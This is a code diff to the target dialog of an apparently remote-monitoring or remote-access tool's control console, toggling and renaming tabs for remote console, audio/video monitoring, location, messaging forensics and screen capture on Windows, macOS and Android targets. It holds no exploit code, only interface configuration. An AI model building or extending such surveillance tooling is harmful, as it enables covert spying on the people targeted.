@@ -79,26 +79,26 @@ TargetDlg::TargetDlg(Target* target)
 	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
 	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("外部插件")));*/
 
-	if ( SYSTEM_WINDOWS != GetSystemType(this->tarBlock->dwOsBuildNumber) )
-	{
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("远程控制台")));
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("外部插件")));
-	}
+	//if ( SYSTEM_WINDOWS != GetSystemType(this->tarBlock->dwOsBuildNumber) )
+	//{
+	//	//ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("远程控制台")));
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("外部插件")));
+	//}
 
-	if ( SYSTEM_ANDROID != GetSystemType(this->tarBlock->dwOsBuildNumber) )
-	{
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("地图定位")));
-	}
+	//if ( SYSTEM_ANDROID != GetSystemType(this->tarBlock->dwOsBuildNumber) )
+	//{
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("地图定位")));
+	//}
 
-	if ( !MobileDevice(this->tarBlock) )
-	{
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
-	}
-	else
-	{
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
-	}
+	//if ( !MobileDevice(this->tarBlock) )
+	//{
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
+	//}
+	//else
+	//{
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
+	//}
 
 	/*if ( SYSTEM_IOS != this->tarBlock->m_sysType )
 	{
@@ -115,19 +115,21 @@ TargetDlg::TargetDlg(Target* target)
 
 	InitConnection();
 
-	// 检测用
-	ui.trMissionStatus->topLevelItem(4)->setHidden(true);
-	if ( SYSTEM_WINDOWS == GetSystemType(this->tarBlock->dwOsBuildNumber) )
-	{
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")));
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
-	}
-	if ( SYSTEM_MACOSX == GetSystemType(this->tarBlock->dwOsBuildNumber) )
-	{
-		ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
-	}
+	//// 检测用
+	//ui.trMissionStatus->topLevelItem(4)->setHidden(true);
+	//if ( SYSTEM_WINDOWS == GetSystemType(this->tarBlock->dwOsBuildNumber) )
+	//{
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")));
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("音视频监控")));
+	//}
+	//if ( SYSTEM_MACOSX == GetSystemType(this->tarBlock->dwOsBuildNumber) )
+	//{
+	//	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("高级文件监控")));
+	//}
 
-	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("日志记录")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("地图定位")));
+	ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("即时通讯取证")));
+	//ui.tabMain->removeTab(GetTabIndexFromName(QString::fromLocal8Bit("日志记录")));
 	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("文件控制")), QString::fromLocal8Bit("文件浏览"));
 	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("用户行为监控")), QString::fromLocal8Bit("敏感信息"));
 	ui.tabMain->setTabText(GetTabIndexFromName(QString::fromLocal8Bit("屏幕监控")), QString::fromLocal8Bit("屏幕截图"));
